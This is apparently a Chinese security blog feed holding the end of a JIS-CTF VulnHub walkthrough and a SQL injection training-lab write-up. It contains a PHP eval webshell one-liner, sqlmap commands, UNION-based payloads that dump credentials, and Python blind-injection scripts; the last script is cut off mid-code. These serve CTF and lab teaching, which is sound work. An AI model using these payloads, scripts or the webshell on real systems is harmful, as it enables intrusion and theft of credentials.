class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--username : admin</span></span></span><br><span class="line"><span class="xml">password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="xml">The 2nd flag is : </span><span class="template-variable">&#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="xml">--&gt;</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>The 2nd flag is : {7412574125871236547895214}</p><p>而且账户名是admin</p><p>密码是3v1l_H@ck3r</p><h3 id="（6）找第三个flag"><a href="#（6）找第三个flag" class="headerlink" title="（6）找第三个flag"></a>（6）找第三个flag</h3><p>在主页面输入账号密码登录进来</p><p><img src="/%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98.assets/image-20180601203736905.png" alt="image-20180601203736905"></p><p>看来是个文件上传，试一下。</p><p>上传个php文件一句话木马</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[cmd])<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>左上角显示SUCCESS，看来没什么过滤。</p><p>不知道上传到哪了，找一下先前禁止的目录中的/uploaded_files和/uploads</p><p>在/uploaded_files/yijuhua.php发现上传的一句话木马，用菜刀连接试试。不知道为什么连不上。换个大马上传下试试。上传小朋友大马再登录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">1.118</span><span class="regexp">/uploaded_files/</span>xiaopengyou.php</span><br></pre></td></tr></table></figure><p>成功连接上</p><p>在根目录下发现文件hint.txt.</p><p>里面有第三个flag</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">3</span>rd flag <span class="keyword">is</span> : &#123;<span class="number">7645110034526579012345670</span>&#125;</span><br></pre></td></tr></table></figure><p>还有提示：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">try <span class="keyword">to</span> <span class="builtin-name">find</span><span class="built_in"> user </span>technawi password <span class="keyword">to</span> read the flag.txt file, you can <span class="builtin-name">find</span> it <span class="keyword">in</span> a hidden file ;)</span><br></pre></td></tr></table></figure><p>而且里面还有flag.txt，发现没有权限。看上面的权限需要找到用户technawi的密码，而且提示在一个隐藏文件中。</p><h3 id="（7）找第四个flag"><a href="#（7）找第四个flag" class="headerlink" title="（7）找第四个flag"></a>（7）找第四个flag</h3><p>下一关应该是相当难的，先在大马中反弹shell到自己端口上，然后利用shell进行操作。我找遍了网站下所有文件都没发现含有technawi密码的隐藏文件，因为它说是hidden file，我理解的是隐藏文件，所以一直在用ls查找。找不到了于是在全局找technawi，找半天也没找到对的，因为太多包含technawi的了。最后机智的想到是不是该找下一个flag了，按以前文件的格式应该是the 4th flag is,于是利用</p><p>grep “the 4th flag”    #注意时间会比价慢</p><p>终于在/etc/mysql/conf.d/credentials.txt文件中找出第四个flag</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">The <span class="number">4</span>th flag <span class="keyword">is</span> : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : <span class="type">technawi</span></span><br><span class="line">password : 3<span class="type">vilH</span>@ksor</span><br></pre></td></tr></table></figure><p>The 4th flag is : {7845658974123568974185412}   </p><h3 id="（7）找第五个flag"><a href="#（7）找第五个flag" class="headerlink" title="（7）找第五个flag"></a>（7）找第五个flag</h3><p>因为先前查找时已经发现flag.txt属于technawi用户，证明可以用technawi登录ssh，于是</p><p>ssh <a href="mailto:technawi@192.168.1.118">technawi@192.168.1.118</a></p><p>然后vim /var/www/html/flag.txt发现第五个flag</p><p>technawi</p><p>The 5th flag is : {5473215946785213456975249}</p><p>Good job :)</p><p>You find 5 flags and got their points and finish the first scenario….</p><p>到此五个flag全部找出。</p><p>[注]后来去网上寻找才发现直接用</p><p>find / -user technawi 2&gt;/dev/null 寻找更快</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;JIS-CTF-靶机测试&quot;&gt;&lt;a href=&quot;#JIS-CTF-靶机测试&quot; class=&quot;headerlink&quot; title=&quot;JIS-CTF 靶机测试&quot;&gt;&lt;/a&gt;JIS-CTF 靶机测试&lt;/h1&gt;&lt;p&gt;​                                                                                      &lt;/p&gt;
&lt;h2 id=&quot;一、环境搭建&quot;&gt;&lt;a href=&quot;#一、环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一、环境搭建&quot;&gt;&lt;/a&gt;一、环境搭建&lt;/h2&gt;&lt;p&gt;从下面网站下载ova文件并导入到virtual box中。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="靶机" scheme="http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>合天培训_实验_sql注入</title>
    <link href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/</id>
    <published>2020-05-01T09:00:13.000Z</published>
    <updated>2020-05-01T12:53:46.701Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。</p><a id="more"></a><h2 id="1-数字型注入"><a href="#1-数字型注入" class="headerlink" title="1.数字型注入"></a>1.数字型注入</h2><p>直接用sqlmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 –dbs  #列数据库信息</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 --current-db 查看当前使用的数据库</span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab --tables   #查看数据库下的表名</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns</span><br><span class="line"></span><br><span class="line">sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns --dump</span><br></pre></td></tr></table></figure><p>手工注入：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"><span class="number">-1</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()</span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20f</span>rom%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span><span class="keyword">and</span>%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span></span><br><span class="line"><span class="number">-1</span>%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20f</span>rom%<span class="number">20</span>user</span><br></pre></td></tr></table></figure><p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p><h2 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' 报错</span></span><br><span class="line"><span class="string">'</span><span class="meta">%</span><span class="number">23</span> 正确</span><br></pre></td></tr></table></figure><p>猜测为字符型注入。</p><p>爆库</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=database() %<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,<span class="number">2</span>,group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span>where%<span class="number">20</span>table_schema=database()%<span class="number">20</span>and%<span class="number">20</span>table_name=%<span class="number">27</span>user%<span class="number">27</span> %<span class="number">23</span></span><br><span class="line"><span class="number">-1</span>'%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">201</span>,username,password%<span class="number">20</span>from%<span class="number">20</span>user %<span class="number">23</span></span><br></pre></td></tr></table></figure><p>得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3</p><h2 id="3-布尔盲注"><a href="#3-布尔盲注" class="headerlink" title="3.布尔盲注"></a>3.布尔盲注</h2><p>（1）判断类型</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' 不显示结果</span><br><span class="line"><span class="number">1</span>%<span class="number">27</span>%<span class="number">23</span> 正确  you are in</span><br></pre></td></tr></table></figure><p>根据方法判断是盲注</p><p>根据http response看出是布尔型</p><p>（2）列数</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>' order by <span class="number">5</span> % <span class="number">23</span> 二分爆出列数<span class="number">3</span></span><br></pre></td></tr></table></figure><p>（3）脚本爆表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span></span><br><span class="line">target_url=<span class="string">"&#123;url&#125;' and &#123;payload&#125;%23"</span></span><br><span class="line">string_set = string.printable+<span class="string">',_'</span></span><br><span class="line"><span class="comment">#判断条件可以选择length,substr,regexp,left等函数</span></span><br><span class="line">value_statement=<span class="string">'(select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;) '</span></span><br><span class="line">length_statement=<span class="string">'(select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;) '</span></span><br><span class="line">MAX_LEN = <span class="number">10000</span></span><br><span class="line">ASCII_MAX = <span class="number">128</span></span><br><span class="line">TRUE_FLAG=<span class="string">"You are in"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,begin,end,column_name,table_name,where_statement)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.begin = begin</span><br><span class="line">        self.end = end</span><br><span class="line">        self.value = <span class="string">''</span></span><br><span class="line">        self.column_name = column_name</span><br><span class="line">        self.table_name = table_name</span><br><span class="line">        self.where_statement = where_statement</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        value = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> cur_index <span class="keyword">in</span> range(self.begin,self.end+<span class="number">1</span>):</span><br><span class="line">            begin = <span class="number">0</span></span><br><span class="line">            end = ASCII_MAX</span><br><span class="line">            <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">                mid = (begin+end)//<span class="number">2</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'='</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid </span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol=<span class="string">'&gt;'</span>,ascii_number=mid)</span><br><span class="line">                <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">                    begin = mid + <span class="number">1</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    end = mid - <span class="number">1</span></span><br><span class="line">            value += chr(begin)</span><br><span class="line">            <span class="comment">#print("value:%s"%value)</span></span><br><span class="line">        self.value = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">selectIsTrue</span><span class="params">(payload)</span>:</span></span><br><span class="line">    <span class="comment">#print("url:"+target_url.format(url=url,payload=payload))</span></span><br><span class="line">    content = requests.get(target_url.format(url=url,payload=payload)).content.decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    <span class="keyword">if</span> TRUE_FLAG <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_len</span><span class="params">(column_name,table_name,where_statement)</span>:</span> </span><br><span class="line">    begin=<span class="number">0</span></span><br><span class="line">    end=MAX_LEN</span><br><span class="line">    <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">        mid = (begin+end)//<span class="number">2</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'='</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol=<span class="string">'&gt;'</span>,number=mid)</span><br><span class="line">        <span class="keyword">if</span> selectIsTrue(payload):</span><br><span class="line">            begin = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = mid - <span class="number">1</span></span><br><span class="line">    length = begin</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line">Thread_Nums=<span class="number">10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_value</span><span class="params">(column_name,table_name,where_statement,length)</span>:</span></span><br><span class="line">    value = <span class="string">''</span></span><br><span class="line">    thread_lists = []</span><br><span class="line">    task_num = length//Thread_Nums</span><br><span class="line">    <span class="keyword">if</span> length &gt;= Thread_Nums:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>,task_num):</span><br><span class="line">            cur_thread = MyThread(i,i+task_num<span class="number">-1</span>,column_name,table_name,where_statement)</span><br><span class="line">            thread_lists.append(cur_thread)</span><br><span class="line">            cur_thread.start()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur_thread = MyThread(<span class="number">1</span>,length,column_name,table_name,where_statement)</span><br><span class="line">        thread_lists.append(cur_thread)</span><br><span class="line">        cur_thread.start()</span><br><span class="line">    <span class="keyword">for</span> cur_thread <span class="keyword">in</span> thread_lists:</span><br><span class="line">        cur_thread.join()</span><br><span class="line">        value += cur_thread.get_result()</span><br><span class="line">    <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    column_name=<span class="string">"group_concat(table_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.tables"</span></span><br><span class="line">    where_statement=<span class="string">"table_schema=database()"</span></span><br><span class="line">    <span class="comment">#判断表长度</span></span><br><span class="line">    all_table_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_table_name_len:%s"</span>%all_table_name_len)</span><br><span class="line">    <span class="comment">#找表名</span></span><br><span class="line">    all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len)</span><br><span class="line">    print(<span class="string">"all_table_name:%s"</span>%all_table_name)</span><br><span class="line">    <span class="comment">#comment,comments,emails,referers,string,user,user</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#判断列长度</span></span><br><span class="line">    column_name=<span class="string">"group_concat(column_name)"</span></span><br><span class="line">    table_name=<span class="string">"information_schema.columns"</span></span><br><span class="line">    t_name = input(<span class="string">"输入要查询的表名\n"</span>)</span><br><span class="line">    where_statement=<span class="string">"table_schema=database() and table_name='&#123;t_name&#125;'"</span>.format(t_name=t_name)</span><br><span class="line">    all_column_name_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">    print(<span class="string">"all_column_name_len:%s"</span>%all_column_name_len)</span><br><span class="line">    all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len)</span><br><span class="line">    print(<span class="string">"all_column_name:%s"</span>%all_column_name)</span><br><span class="line"></span><br><span class="line">    c_names = input(<span class="string">"输入所有要查询的字段,以逗号分开\n"</span>).split(<span class="string">','</span>)</span><br><span class="line">    <span class="keyword">for</span> c_name <span class="keyword">in</span> c_names:</span><br><span class="line">        column_name=<span class="string">"group_concat(&#123;column_name&#125;)"</span>.format(column_name=c_name)</span><br><span class="line">        table_name=t_name</span><br><span class="line">        where_statement = <span class="string">"1"</span></span><br><span class="line">        all_value_len = get_len(column_name,table_name,where_statement)</span><br><span class="line">        print(<span class="string">"%s_length:%s"</span>%(c_name,all_value_len))</span><br><span class="line">        all_value = get_value(column_name,table_name,where_statement,all_value_len)</span><br><span class="line">        print(<span class="string">"%s_value:%s"</span>%(c_name,all_value))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>username:admin password:21232f297a57a5a743894a0e4a801fc3</p><p>或者直接sqlmap</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B --dbs</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab --tables</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab -T<span class="built_in"> user </span>--columns</span><br><span class="line">python sqlmap.py -u <span class="string">"http://47.105.75.177/vulnlab/sqli/index2.php?id=1"</span> -technique B -D hetianlab -T<span class="built_in"> user </span>--dump</span><br></pre></td></tr></table></figure><h2 id="4-时间盲注"><a href="#4-时间盲注" class="headerlink" title="4.时间盲注"></a>4.时间盲注</h2><p>尝试</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>' and sleep(<span class="number">3</span>) %<span class="number">23</span>   <span class="comment">//where 语句里面可以用sleep函数。</span></span><br></pre></td></tr></table></figure><p>发现时间延长。</p><p>所以可以直接用脚本爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">"http://47.105.75.177/vulnlab/sqli/index3.php?id=1"</span></span><br><span class="line">target_url=<span class="string">"&#123;url&#125;' and &#123;payload&#125;%23"</span></span><br><span class="line">string_set = string.printable+<span class="string">',_'</span></span><br><span class="line"><span class="comment">#判断条件可以选择length,substr,regexp,left等函数</span></span><br><span class="line">Sleep_Function=<span class="string">"sleep(3)"</span></span><br><span class="line">value_statement=<span class="string">'if ((select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;),'</span>+Sleep_Function+<span class="string">",1)"</span></span><br><span class="line">length_statement=<span class="string">'if ((select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;),'</span> + Sleep_Function+<span class="string">',1)'</span></span><br><span class="line">MAX_LEN = <span class="number">10000</span></span><br><span class="line">ASCII_MAX = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,begin,end,column_name,table_name,where_statement)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.begin = begin</span><br><span class="line">        self.end = end</span><br><span class="line">        self.value = <span class="string">''</span></span><br><span class="line">        self.column_name = column_name</span><br><span class="line">        self.table_name = table_name</span><br><span class="line">        self.where_statement = where_statement</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        value = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> cur_index <span class="keyword">in</span> range(self.begin,self.end+<span class="number">1</span>):</span><br><span class="line">            begin = <span class="number">0</span></span><br><span class="line">            end = ASCII_MAX</span><br><span class="line">            <span class="keyword">while</span> begin &lt;= end:</span><br><span class="line">                mid = (begin+end)//<span class="number">2</span></span><br><span class="line">                